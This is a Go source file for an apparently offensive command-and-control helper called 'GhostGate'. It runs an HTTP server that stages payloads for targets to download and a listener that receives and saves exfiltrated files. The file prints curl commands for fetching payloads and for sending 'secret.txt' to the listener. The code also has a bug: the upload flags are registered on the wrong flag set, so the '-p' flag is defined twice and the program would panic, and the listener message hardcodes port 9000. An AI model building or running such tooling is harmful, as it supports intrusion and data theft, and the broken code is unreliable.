package main

import (
	"GhostGate/config"
	"GhostGate/internal/networking"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
)

// Function for staging the payload directory
func stagePayloadDirectory(port string, stagingDir string)  {
	// Creates the staging diredctory if it doesnt exist
	if _, err := os.Stat(stagingDir); os.IsNotExist(err) {
		// Stores the errors from creating the directory
		err := os.MkdirAll(stagingDir, 0755)

		// Checks if there is a error
		if err != nil {
			log.Fatal("Error creating directory:", err)
		}

		// Add a possible section for adding files from a folder here
	}

	// Creates the file server handler
	fileServer := http.FileServer(http.Dir(stagingDir))

	// Outputs information
	fmt.Printf("[*] Go Payload Staging Server running on port %s\n", port)
	fmt.Printf("[*] Serving files from: %s\n", stagingDir)
	fmt.Printf("[*] Target download example: curl http://%s:%s/%s/file\n", networking.GetOutboundIP(), port, stagingDir)

	// Starts the server
	err := http.ListenAndServe(":"+port, fileServer)

	// Checks if there is an error
	if err != nil {
		log.Fatal("Server failed:", err)
	}
}

// Function to handle file uploads
func uploadHandler(writer http.ResponseWriter, reader *http.Request) {
	// Checks if the correct method was being used
	if reader.Method != http.MethodPost {
		// Returns a error message
		http.Error(writer, "Use POST to exfiltrate data", http.StatusMethodNotAllowed)
		return
	}

	// Creates a directory to store the data send to the server
	exfilDir := "./exfiltrated_data"
	os.MkdirAll(exfilDir, os.ModePerm)

	// Retrieves a filename from a custom header if not uses a default
	filename := reader.Header.Get("X-File-Name")

	// Checks if the filename is a empty string
	if filename == "" {
		// Creates the new file name
		filename = "exfil_data.bin"
	}

	// Creates the destination path
	dstPath := filepath.Join(exfilDir, filename)

	// Creates the file and gets the error
	dst, err := os.Create(dstPath)

	// Checks for errors
	if err != nil {
		// Returns an http header
		http.Error(writer, "Failed to create destination file", http.StatusInternalServerError)
		return
	}

	// Closes the path when done
	defer dst.Close()

	// Stream the body directly to disk to handle large "exfiltrations" efficiently
	bytesCopied, err := io.Copy(dst, reader.Body)

	// Checks for an error
	if err != nil {
		// Logs the error
		log.Printf("[!] Error during exfiltration from %s: %v", reader.RemoteAddr, err)
		return
	}

	// Outputs a success message 
	log.Printf("[+] Exfiltration Successful: %d bytes received from %s saved as %s", bytesCopied, reader.RemoteAddr, filename)
	// Writes the header
	writer.WriteHeader(http.StatusCreated)
}

func main(){
	// Checks if the init command is called
	if len(os.Args) > 1 && os.Args[1] == "init" {
		// Initalises the configuration file
		config.InitializeConfig()
		return
	}

	/*
		Flags for each function which the listner can carry out
	*/

	// Stores the flag set for setting up a payload staging directory
	stageDirectoryOption := flag.NewFlagSet("stageDir", flag.ExitOnError)

	// Stores the flags for this flagset
	stageDirectoryPort := stageDirectoryOption.String("p", "8080", "Specifies the port number to host the server")
	stageDirectoryDir := stageDirectoryOption.String("f", "payloads", "Specifies the file path of the directory")

	// Stores the flag set for uploading files
	uploadFilesOption := flag.NewFlagSet("uploadFile", flag.ExitOnError)

	// Stores the flags for this flagset
	uploadFilesPort := stageDirectoryOption.String("p", "8080", "Specifies the port number to host the server")
	uploadFilesUrlPath := stageDirectoryOption.String("u", "/upload", "Specifies the URL path to host the endpoint")

	// Checks if the user has provided a subcommand
	if len(os.Args) < 2 {
		// Outputs an invaild command
		fmt.Println("Unexpected input")
		// Exits the program
		os.Exit(1)
	}

	// Switch to select the command to be used
	switch os.Args[1] {
	case "stageDir":
		// Parse the flags starting from the 3rd argument (index 2)
		stageDirectoryOption.Parse(os.Args[2:])

		// Performs a length check on the stage directory port
		if len(*stageDirectoryPort) > 5 {
			log.Fatalf("Invalid port: %s. Port must be a length of 5 or lower", *stageDirectoryPort)
		}

		// Checks if the port flag is a number
		_, err := strconv.Atoi(*stageDirectoryPort)
		
		if err != nil {
			log.Fatalf("Invalid port: %s. Port must be a number", *stageDirectoryPort)
		}

		// Converts the port number to perform a range check
		port, err := strconv.Atoi(*stageDirectoryPort)

		if err != nil || port < 1 || port > 65535 {
			log.Fatalf("Invalid port: %s. Port must be a number between 1 and 65535", *stageDirectoryPort)
		}

		// Checks if the directory contains letters
		match, _ := regexp.MatchString(`[[:alpha:]]`, *stageDirectoryDir)

		// Checks if there is not a match
		if !match {
			log.Fatalf("Invaild format: %s. Directory must include some letters", *stageDirectoryDir)
		}

		// Passes the flags into the function
		stagePayloadDirectory(*stageDirectoryPort, *stageDirectoryDir)
	case "uploadFile":
		// Parse the flags
		uploadFilesOption.Parse(os.Args[2:])

		// Performs a length check on the stage directory port
		if len(*uploadFilesPort) > 5 {
			log.Fatalf("Invalid port: %s. Port must be a length of 5 or lower", *uploadFilesPort)
		}

		// Checks if the port flag is a number
		_, err := strconv.Atoi(*uploadFilesPort)
		
		if err != nil {
			log.Fatalf("Invalid port: %s. Port must be a number", *uploadFilesPort)
		}

		// Converts the port number to perform a range check
		port, err := strconv.Atoi(*uploadFilesPort)

		if err != nil || port < 1 || port > 65535 {
			log.Fatalf("Invalid port: %s. Port must be a number between 1 and 65535", *uploadFilesPort)
		}

		// Checks if the directory contains letters
		match, _ := regexp.MatchString(`[[:alpha:]]`, *uploadFilesUrlPath)

		// Checks if there is not a match
		if !match {
			log.Fatalf("Invaild format: %s. URL path must include some letters", *uploadFilesUrlPath)
		}

		// Checks for if the string starts with a forward dash
		if !strings.HasPrefix(*uploadFilesUrlPath, "/"){
			log.Fatalf("Invaild format: %s. URL path must include '/'", *uploadFilesUrlPath)
		}

		// Handles the function
		http.HandleFunc(*uploadFilesUrlPath, uploadHandler)

		// Prints information about the path
		fmt.Println("[*] Data Exfiltration Listener active on port 9000")
		fmt.Println("[*] Test Command: curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://localhost:9000/upload")

		if err := http.ListenAndServe(":" + *uploadFilesPort, nil); err != nil {
			log.Fatal(err)
		}
	}
}